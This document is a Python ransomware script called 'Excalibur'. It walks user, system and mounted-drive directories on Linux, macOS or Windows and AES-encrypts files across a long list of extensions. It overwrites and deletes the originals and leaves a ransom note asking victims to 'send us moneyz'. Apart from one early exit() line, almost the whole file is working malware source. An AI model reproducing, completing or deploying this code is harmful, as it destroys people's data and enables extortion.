#!/usr/bin/env python3
# -=-=-=-=-=-A-=-e-=-S-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #
#                                                                          #
#       Author       -   pyCity                                            #
#       Date         -   4/25/19                                           #
#       Version      -   0.1dev                                            #
#                                                                          #
#       Usage        -   python3 Excalibur.py -h                           #
#                                                                          #
#       Development  -   For quick test cases:                             #
#                    -      python3 -c 'import Excalibur; \                #
#                           Excalibur.main(sys.argv[1:])'                  #
#                                                                          #
#                    +   As an importable module:                          #
#                         - import Excalibur, sys                          #
#                         - Excalibur.main(sys.argv[1])                    #
#                                                                          #
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=A-=-e-=-S-=-=-=-=-=-=- #
import os
import sys
import argparse

from getpass import getpass
from time import time

try:
    from concurrent.futures import ThreadPoolExecutor
    from base64 import encodebytes
except ImportError:
    raise ImportError("Python3.7 is required for usage")

try:
    from tqdm import tqdm
    from Crypto import Random
    from Crypto.Hash import SHA256
    from Crypto.Cipher import AES
except ImportError:
    raise ImportError("Dependencies not satisfied. Install requirements.txt to continue")

# --------------------------------------------------------------------------

# Global Variables

# Artwork
ascii_art = """
 ________                                __  __  __                           
|        \                              |  \|  \|  \                          
| $$$$$$$$ __    __   _______   ______  | $$ \$$| $$____   __    __   ______  
| $$__    |  \  /  \ /       \ |      \ | $$|  \| $$    \ |  \  |  \ /      \ 
| $$  \    \$$\/  $$|  $$$$$$$  \$$$$$$\| $$| $$| $$$$$$$\| $$  | $$|  $$$$$$\  
| $$$$$     >$$  $$ | $$       /      $$| $$| $$| $$  | $$| $$  | $$| $$   \$$
| $$_____  /  $$$$\ | $$_____ |  $$$$$$$| $$| $$| $$__/ $$| $$__/ $$| $$      
| $$     \|  $$ \$$\ \$$     \ \$$    $$| $$| $$| $$    $$ \$$    $$| $$      
 \$$$$$$$$ \$$   \$$  \$$$$$$$  \$$$$$$$ \$$ \$$ \$$$$$$$   \$$$$$$  \$$                                                                   
                           ___
                          ( ((
                           ) ))
  .::.                    / /(
 'A .-;-.-.-.-.-.-.-.-.-/| ((::::::::::::::::::::::::::::::::::::::::::::::.._
(E ( ( ( ( ( ( ( ( ( ( ( |  ))   -====================================-      _.>
 `S `-;-`-`-`-`-`-`-`-`-\| ((::::::::::::::::::::::::::::::::::::::::::::::''
  `::'                    \ \(
                           ) ))
                          (_((                
"""


# Note to leave in each path, edit this to fit your needs
note = "Whoops! We're sorry! Your files have been encrypted. And the only way to decrypt" \
       " them is with the key. If you want the key, you must send us moneyz"


# Class for pretty printing
class Colors:
    bold = "\033[1m"
    underline = "\033[4m"
    white = "\033[1;97m"
    blue = "\033[94m"
    red = "\033[91m"
    green = "\033[92m"
    purple = "\033[95m"


# Array of target extensions that we want to encrypt. Might want to comment out the first row.
target_extensions = [
    'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # System files. May destroy system
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # Images
    'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # Music and sound
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies
    'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',  # OpenOffice, Adobe, Latex, Markdown, etc
    'yml', 'yaml', 'json', 'xml', 'csv',  # Structured data
    'db', 'sql', 'dbf', 'mdb', 'iso',  # Databases and disc images
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # Web technologies
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
    'java', 'class', 'jar',  # Java source code
    'ps', 'bat', 'vb',  # Windows based scripts
    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # Linux/mac based scripts
    'go', 'py', 'pyc', 'bf', 'coffee',  # Other source code files
    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # Compressed formats
]

# --------------------------------------------------------------------------

# Get the system's OS to determine pathing
if sys.platform.lower() in ["linux", "darwin"]:
    paths = "/home", "/media", "/mnt", "/etc", "/run", "/srv", "/opt", "\var"  # "/usr"  #, "/root"

elif sys.platform.lower() in ["win32", "win64", "windows", "nt"]:
    paths = "C:\\ ", "D:\\ ", "E:\\ ,""."

else:
    raise(Colors.white+"Unknown OS")

# --------------------------------------------------------------------------

# Encryption class


class AesExcalibur:
    """
#****************************************************************************************************#
#-------------------------------------------AesExcalibur Data----------------------------------------#
#                                                                                                    #
# Class Goal: Create an object with methods to encrypt or decrypt files                              #
#                                                                                                    #
#       Methods:                                                                                     #
#                                                                                                    #
#   pad            - Static method used to pad the supplied key with the AES block size.             #
#                                                                                                    #
#   encrypt        - Encrypt takes stream of plaintext message and returns the encrypted message     #
#                                                                                                    #
#   decrypt        - Decrypt an encrypted stream of ciphertext and returns the plaintext             #
#                                                                                                    #
#   encrypt_file   - This function tries to read a file in binary mode, then calls encrypt() on      #
#                    the binary stream. Next it rewrites the original filename as .aes and removes   #
#                    the original file. If an error occurs, skip to the next file.                   #
#                                                                                                    #
#   decrypt_file   - Reverse of encrypt_file                                                         #
#                                                                                                    #
#****************************************************************************************************#
 """

    def __init__(self, password):
        self.key = SHA256.new(password).digest()
        self.total = 0  # Total amount of files modified

    def __str__(self):
        return "Total number of files modified: {}".format(self.total)

    @staticmethod
    def pad(message):
        return message + b"\0" * (AES.block_size - len(message) % AES.block_size)

    def encrypt(self, plain_text):
        """Encrypt a stream of text"""
        padded_text = self.pad(plain_text)
        IV = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, IV)
        return IV + cipher.encrypt(padded_text)

    def decrypt(self, cipher_text):
        """Decrypt a stream of text"""
        IV = cipher_text[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, IV)
        plaintext = cipher.decrypt(cipher_text[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def encrypt_file(self, file_name):
        """Read file, encrypt the text, write the encrypted text to a new file, remove the original"""
        try:
            with open(file_name, 'rb') as f:
                plain_text = f.read()
            encrypted = self.encrypt(plain_text)
            with open(file_name + ".AeS", 'wb+') as f:
                f.write(encrypted)
            secure_delete(file_name)  # Remove the original in a the same thread pool
            self.total += 1
        except (IOError, ValueError, FileNotFoundError, Exception):
            pass  # Suppress output for progress bars

    def decrypt_file(self, file_name):
        """Read file in, decrypt the text, write the decrypted text to a new file, remove the original"""
        try:
            with open(file_name, 'rb') as f:
                cipher_text = f.read()
            decrypted = self.decrypt(cipher_text)
            with open(file_name[:-4], 'wb+') as f:
                f.write(decrypted)
            secure_delete(file_name)
            self.total += 1
        except (IOError, ValueError, FileNotFoundError) as err:
            print(Colors.red + "An error occured: {}".format(err))


# --------------------------------------------------------------------------

# Utility Functions


def parse_args(args):
    parser = argparse.ArgumentParser(description="Cross platform ransomeware module in python3.7")
    parser.add_argument("-e", "--encrypt", action="store_true", default=False,
                        help="Encrypt the entire filesystem", required=False)

    parser.add_argument("-d", "--decrypt", action="store_true", default=False,
                        help="Decrypt the entire filesystem", required=False)

    parser.add_argument("-s", "--secret", type=str, help="Password to use as key")
    parser.add_argument("-p", "--passes", type=int, help="Number of passes for shredding file")
    return parser.parse_args(args)


def recursive_walk(path_list, extensions, mode):
    """
    Walk through each path in the filesystem, return a generator object of
    valid files to encrypt or decrypt as an iterator

    :param path_list:         Array of paths to walk recursively
    :param extensions:        Array of extensions to target
    :param mode:              Encryption mode (encrypt or decrypt)
    :returns generator:       Generator object of files to target
    """

    for path in path_list:
        for root, _, files in os.walk(path):  # root=path, _=subdirectories, files=files of any type
            for file in files:
                if file not in [sys.argv[0], __name__, "L0VE_NOTE.txt"]:  # Ignore self and ransom note
                    abs_path = os.path.join(root, file)  # Get the files absolute path and extension
                    ext = abs_path.split(".")[-1]
                    if mode is 1:
                        if ext in extensions:
                            yield os.path.join(root, file)
                    elif mode is 2:
                        if "AeS" in ext:
                            yield os.path.join(root, file)
                    else:
                        raise Exception("Incorrect mode parameter was passed!")


def secure_delete(filename, passes=5):
    """
    Perform a manual 5 pass overwrite using os

    :param passes:    Amount of passes to write garbage to the file
    :param filename:  absolute path of file to delete
    """

    if not os.path.exists(filename):  # Most secure delete ever
        return
    with open(filename, "ab+") as f:
        length = f.tell()  # Read each line of the file until the end
        for _ in range(0, passes):  # _ in python is short for a variable that isn't used
            f.seek(0)  # Move back to the start of the file
            f.write(os.urandom(length))  # Write garbage to file
    os.remove(filename)


def serve_payload(mode, password):
    """Run either encrypt or decrypt in a thread pool

    :type password:
    :type mode:
    """

    start = time()  # Start benchmarking payload time
    encoded_pass = encodebytes(bytes(password, "utf-8"))  # Base64 encode password for added length before hashing
    sanctuary = AesExcalibur(encoded_pass)  # Initialize encryption object in memory (Also encrypts key)
    files = recursive_walk(paths, target_extensions, mode)  # Create a generator object with targeted files as iterables

    with ThreadPoolExecutor(max_workers=25) as pool:  # Serve payload in with max 25 threads in the thread pool
        if mode is 1:
            print(Colors.white + "Encrypting system")
            pool.map(sanctuary.encrypt_file, tqdm(files, unit=" files", miniters=int(223265/100),
                                                  ascii=True, desc="Encryption status"))  # Begin applying encryption

            try:
                for path in paths:
                    with open(path + "/L0VE_NOTE.txt", "w+") as f:
                        f.write(note)
            except: pass

        elif mode is 2:  # Begin applying decryption
            print(Colors.white + "Decrypting system")
            pool.map(sanctuary.decrypt_file, tqdm(files, unit=" files", miniters=int(223265/100),
                                                  ascii=True, desc="Decryption status: "))

    # Print total
    print(Colors.green + sanctuary.__str__())
    print(Colors.green + "Total runtime: {}\n".format(time() - start))

    # # Encrypt this file
    answer = input("Encrypt this file? [y/n]")
    if answer in ["y", "Y", "yes", "YES"]:
        sanctuary.encrypt_file(os.path.abspath(__file__))
        sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))
    else:
        pass
# --------------------------------------------------------------------------


def main(args=None):
    """
    Recursively encrypt or decrypt the filesystem
    Print beautiful artwork
    Ward away the skids with the almighty exit()
    """
    os.system("clear" if "linux" in sys.platform else "cls")
    exit("THIS WILL HARM YOUR COMPUTER")
    print(Colors.blue + ascii_art)

    # If user entered any arguments, run them through parse_args()
    if args:
        args = parse_args(args)
        print(Colors.white + "Arguments entered: {}".format(args))

    # User didn't enter any args. Get input manually
    if not args:
        user_input = input(Colors.green + "Encrypt or Decrypt? [e/d] ")
        if user_input in ["e", "E", "enc", "encrypt", "Encrypt"]:
            password = getpass(Colors.bold + "Enter a password for the encryption key: ")
            serve_payload(mode=1, password=password)

        elif user_input in ["d", "D", "dec", "decrypt", "Decrypt"]:
            password = getpass(Colors.bold + "Enter a password for the encryption key: ")
            serve_payload(mode=2, password=password)

        else:
            exit(Colors.red + "Invalid input")

    # User chose encrypt system
    elif args.encrypt:

        # User entered some args but didn't enter a password variable
        if not args.secret:
            password = getpass(Colors.bold + "Enter a password for the encryption key: ")
            serve_payload(mode=1, password=password)
        else:
            serve_payload(mode=1, password=args.secret)

    # User chose decrypt system
    elif args.decrypt:

        # User entered some args but didn't enter a password variable
        if not args.secret:
            password = getpass(Colors.bold + "Enter a password for the encryption key: ")
            serve_payload(mode=2, password=password)
        else:
            serve_payload(mode=2, password=args.secret)


if __name__ == '__main__':
    # If this script is run directly, use sys.argv for input
    # instead of argparse which allows the file to be used as a module
    main(sys.argv[1:])

